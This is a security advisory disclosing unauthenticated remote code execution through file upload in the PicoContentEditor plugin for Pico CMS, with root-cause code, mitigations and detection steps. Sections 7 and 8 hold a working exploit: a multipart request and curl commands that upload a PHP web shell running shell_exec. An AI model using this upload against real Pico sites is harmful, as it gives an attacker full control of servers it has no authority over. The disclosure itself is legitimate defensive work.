# Security Advisory: Unrestricted File Upload leading to Remote Code Execution in PicoContentEditor

> **Identifier:** Pending CVE assignment
> **Publication Date:** 11/10/2026
> **Last Updated:** 23/10/2026
> **Severity:** Critical
> **CVSS:** 9.8 · `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
> **CWE:** CWE-306: Missing Authentication for Critical Function (primary); CWE-434: Unrestricted Upload of File with Dangerous Type (contributing)
> **Status:** Unpatched

---

## 1. Executive Summary

PicoContentEditor, a third-party WYSIWYG content editor plugin for Pico CMS, ships with all editing rights (`canEdit`, `canSave`, `canUpload`) defaulting to `true` in `src/Auth.php`. These rights are only restricted if the optional companion plugin `PicoUsers` is also installed and detected at runtime (`class_exists('PicoUsers')`). Since `PicoUsers` is not declared as a hard dependency in `composer.json` and is documented as an optional integration, any installation of PicoContentEditor without PicoUsers — a configuration explicitly permitted by the plugin's own documentation — leaves the file-upload endpoint open to unauthenticated visitors. `src/Uploads.php` performs no extension or MIME-type validation on uploaded files, allowing an unauthenticated attacker to upload a `.php` web shell into a web-accessible, PHP-executable directory (`images/` by default), resulting in full remote code execution. No authentication and no user interaction are required.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| nliautaud/pico-content-editor (PicoContentEditor plugin for Pico CMS) | Commit `02d5ad6c820c5050c542ab9505819b5e0a0ba1af`, installed without PicoUsers | None | Affected |
| Component: `src/Auth.php`, `src/Uploads.php` | Evaluated commit | None | Affected |

- **Repository / Ecosystem:** https://github.com/nliautaud/pico-content-editor (Composer package, `pico-plugin` type)
- **Evaluated stack:** Pico CMS 3.0.0-alpha.2, PicoContentEditor commit `02d5ad6c820c5050c542ab9505819b5e0a0ba1af`, PHP 8.1.34, Apache 2.4.65 (Debian), without `PicoUsers`

### Unaffected Products

- PicoContentEditor installations with `PicoUsers` installed, detected, and configured with restrictive rights for `PicoContentEditor`, `PicoContentEditor/save`, and `PicoContentEditor/upload`

---

## 3. Vulnerability Description

PicoContentEditor registers Pico event hooks (`onContentLoaded`, `onPageRendering`, `onPageRendered`) that process editor save and upload requests independently of whether the editor's front-end UI is rendered by the active theme. Authorization for these actions is governed by the `Auth` class, whose rights default to permissive (`true`) and are only tightened when the optional `PicoUsers` plugin is present:

**Root cause:**

```php
// src/Auth.php
class Auth
{
    private $canEdit = true;
    private $canSave = true;
    private $canUpload = true;   // insecure default

    public static function init($pico)
    {
        // rights are only restricted if PicoUsers happens to be installed
        if (class_exists('PicoUsers')) {
            $PicoUsers = $pico->getPlugin('PicoUsers');
            self::instance()->canEdit   = $PicoUsers->hasRight('PicoContentEditor', true);
            self::instance()->canSave   = $PicoUsers->hasRight('PicoContentEditor/save');
            self::instance()->canUpload = $PicoUsers->hasRight('PicoContentEditor/upload');
        }
        // otherwise canEdit/canSave/canUpload remain true for every visitor
    }
}
```

```php
// src/Uploads.php
public function saveFile($root, $path)
{
    $realpath = realpath($root.$path);
    if ($realpath === false || strpos($realpath, $root) !== 0) {
        Status::add(false, "The upload directory \"$path\" is missing or invalid");
        return;
    }

    $filename = '/' . basename($this->uploadedFile['name']);   // no extension/MIME check
    if (move_uploaded_file($this->uploadedFile['tmp_name'], $realpath.$filename)) {
        // file saved, served from the web root with PHP execution enabled
    }
}
```

`basename()` prevents path traversal in the destination filename, but nothing prevents an attacker-chosen `.php` extension, and no real MIME-type inspection (e.g. `finfo`) is performed on the uploaded content. The destination directory (`uploadpath`, default `images/`) resides inside the Pico document root and is served by Apache with PHP execution enabled, with no restrictive `.htaccess` in place.

### Necessary Conditions

- **Authentication:** None
- **User interaction:** None
- **Attack vector:** Network
- **Preconditions:** PicoContentEditor plugin installed and enabled; `PicoUsers` plugin not installed or not configured with restrictive rights for the `PicoContentEditor` namespace

---

## 4. Impact

An unauthenticated remote attacker can execute arbitrary code on the hosting server by uploading a PHP web shell disguised as an image and then invoking it directly.

- **Confidentiality:** High — full read access to any file reachable by the web server process (`www-data`), including configuration files and other sites on the host
- **Integrity:** High — attacker can modify site content, plant backdoors, and tamper with any file writable by `www-data`
- **Availability:** High — attacker can disrupt or take down the service, or use the compromised host as a pivot point

---

## 5. Classification

### CVSS

- **Score:** 9.8
- **Severity:** Critical
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

| Metric | Value |
|---|---|
| Attack Vector (AV) | N |
| Attack Complexity (AC) | L |
| Privileges Required (PR) | N |
| User Interaction (UI) | N |
| Scope (S) | U |
| Confidentiality (C) | H |
| Integrity (I) | H |
| Availability (A) | H |

### CWE

- CWE-306: Missing Authentication for Critical Function
- CWE-434: Unrestricted Upload of File with Dangerous Type

### CAPEC (optional)

- CAPEC-1: Accessing Functionality Not Properly Constrained by ACLs
- CAPEC-650: Upload a Web Shell to a Web Server

---

## 6. Exploitation Scenario

1. Attacker identifies a Pico CMS site running PicoContentEditor (presence of `plugins/PicoContentEditor/` or editor-related behavior)
2. Attacker sends an unauthenticated `multipart/form-data` POST request to the site root with a field named `PicoContentEditorUpload` containing a `.php` file
3. The plugin's `Uploads` class accepts the file without authentication and without extension/MIME validation, saving it to `images/` under the document root
4. Attacker requests the uploaded file's URL directly in a browser or via `curl`
5. The web server executes the PHP payload, granting the attacker arbitrary command execution as the web server user

---

## 7. Technical Evidence

### Affected Component

```text
File(s): src/Auth.php (lines 21-31, 51-60), src/Uploads.php (lines 59-82)
Parameter(s): multipart field "PicoContentEditorUpload"
Method: POST · Authentication: not required (when PicoUsers absent)
```

### Example Request

```http
POST / HTTP/1.1
Host: 127.0.0.1:9088
Content-Type: multipart/form-data; boundary=----PicoPoC

------PicoPoC
Content-Disposition: form-data; name="PicoContentEditorUpload"; filename="validation_rce_1792418580.php"
Content-Type: image/jpeg

<?php echo "VALIDATED-RCE-1792418580:".shell_exec("id"); ?>
------PicoPoC--
```

### Observed Response

```json
{"status":[{"state":true,"message":"The file have been uploaded"}],
 "edited":{"meta":null,"regions":[]},
 "file":{"name":"/validation_rce_1792418580.php","path":"http://127.0.0.1:9088/images/validation_rce_1792418580.php","size":false},
 "debug":false}
```

### Result

Reproduced in an authorized local lab with Pico CMS 3.0.0-alpha.2 and PicoContentEditor installed without `PicoUsers`. Testing was non-destructive: the uploaded payload only echoed the marker `VALIDATED-RCE-1792418580` and output of `id`; the file and temporary plugin copy were removed afterward, and requesting the uploaded URL returned HTTP 404.

**Evidence:**

<img width="1000" height="1672" alt="vulnerability-exposure" src="https://github.com/user-attachments/assets/f8206954-790d-459c-9e32-5be4797ae2c3" />
<img width="1000" height="1753" alt="poc-execution" src="https://github.com/user-attachments/assets/f4b5ec18-b32f-4218-a9f3-d647165193c0" />

---

## 8. Proof of Concept

This PoC is intended for authorized lab environments only. The concise example below runs the read-only `id` command. The included `poc.sh` creates a command-capable `shell.php` and does not remove the uploaded server-side file automatically; use it only on a disposable lab target and delete the uploaded file immediately after validation.

```text
curl -F "PicoContentEditorUpload=@shell.php;filename=shell.php;type=image/jpeg" http://127.0.0.1:9088/
curl http://127.0.0.1:9088/images/shell.php
```

Where `shell.php` contains:

```php
<?php echo "PWNED-RCE-TEST:".shell_exec("id"); ?>
```

### Expected Result

```text
PWNED-RCE-TEST:uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### PoC Limitations

- Does not cause service disruption.
- Does not modify or remove third-party data.
- The concise payload above only executes `id`; the included automated script also accepts a `cmd` query parameter and therefore must not be exposed beyond an isolated lab.
- The included automated script leaves `images/shell.php` on the target. Remove it manually after the test and verify that its URL returns HTTP 404.
- Does not contain real credentials.
- Does not automate mass exploitation.

The automated flow is available in [poc.sh](https://github.com/user-attachments/files/33978373/poc.sh)
, and the target installation helper is [setup_target.sh](https://github.com/user-attachments/files/33978405/setup_target.sh). The script creates its transient payload and response files under `evidence_run/` when executed; those runtime files are not part of the retained disclosure package.

---

## 9. Reproduction Steps

1. Set up an authorized local instance of Pico CMS 3.0.0-alpha.2.
2. Install the PicoContentEditor plugin into `plugins/PicoContentEditor/` exactly as described in its README, without installing `PicoUsers`.
3. Send the multipart POST request from Section 8 to the site root, with no authentication and no cookies.
4. Observe the JSON response confirming the file was accepted and saved under `images/`.
5. Request the uploaded file's URL and observe the PHP payload executing on the server, compared against the expected safe behavior of a rejected upload when `PicoUsers` is properly configured.
6. Remove the uploaded PHP file and verify that its URL returns HTTP 404.

---

## 10. Mitigation

Until an official fix is available:

- Do not install PicoContentEditor without also installing and configuring `PicoUsers` with restrictive rights for `PicoContentEditor`, `PicoContentEditor/save`, and `PicoContentEditor/upload`.
- If already installed without protection, disable the plugin immediately or block external access to the site root's POST handling via a reverse proxy/WAF rule.
- Disable PHP execution in the upload directory (`images/` or the configured `uploadpath`) via `.htaccess` (`php_admin_flag engine off`) or the equivalent Nginx `location` block.
- Audit the upload directory for any files already planted by an attacker.

> Mitigations reduce risk but may not completely eliminate the vulnerability.

---

## 11. Fix

**No official fix available as of this date.**

Recommended actions:

1. Remove or disable PicoContentEditor until a patched version is released.
2. Restart the affected web server after remediation.
3. Review server logs for POST requests to `/` containing the `PicoContentEditorUpload` field.
4. Confirm the vulnerable behavior can no longer be reproduced.

### Recommended Change to Vendor

- Invert the default to fail-closed: `canEdit`/`canSave`/`canUpload` should default to `false` when no authentication mechanism (such as `PicoUsers`) is detected, requiring explicit opt-in configuration to allow anonymous editing.
- Implement a strict allow-list of file extensions and real MIME-type verification (e.g., via PHP's `finfo`) in `Uploads::saveFile()`.
- Store uploaded files outside the web-executable document root, or rename them to a non-executable extension.

---

## 12. Detection and Indicators

Possible exploitation indicators:

- Unexpected `.php` (or other executable) files appearing under the configured `uploadpath` (default `images/`)
- POST requests to `/` containing a `PicoContentEditorUpload` multipart field from unauthenticated clients
- Unexplained outbound shell command output in access logs for requests to uploaded files

### Example Log Search

```text
grep "PicoContentEditorUpload" access.log
find images/ -iname "*.php"
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 11/10/2026 | Vulnerability identified (static code analysis of PicoContentEditor) |
| 11/10/2026 | Disclosure package prepared |
| 19/10/2026 | Confirmed in an authorized local Pico CMS 3.0.0-alpha.2 lab |
| 23/10/2026 | Documentation reconciled with the retained PoC and evidence artifacts |
| pending | Vendor notified |
| pending | CVE requested or reserved |
| pending | Fix made available |
| pending | Advisory published |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** Nicolas Liautaud (nliautaud)
- **Channel used:** GitHub issue / repository contact (pending)
- **Date of first notification:** pending
- **Response status:** Awaiting response
- **Vendor position:** N/A

---

## 15. Credits

- **Researcher:** Security Researcher
- **Organization:** Pico CMS Security Research Lab
- **Contact:** vinniboy021@gmail.com

---

## 16. References

- CWE-306: https://cwe.mitre.org/data/definitions/306.html
- CWE-434: https://cwe.mitre.org/data/definitions/434.html
- CVSS calculator: https://www.first.org/cvss/calculator/3.1
- Plugin repository: https://github.com/nliautaud/pico-content-editor
- Related optional dependency: https://github.com/nliautaud/pico-users

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 11/10/2026 | Initial publication |
| 1.1 | 23/10/2026 | Aligned the evaluated version, observed evidence, and local artifact links |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

The information was obtained in an authorized local lab environment (self-hosted Docker containers) and disclosed responsibly. The author does not encourage unauthorized access, service disruption, privacy violations, or any illegal activity. Use of this information is the reader's responsibility.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/nliautaud/pico-content-editor
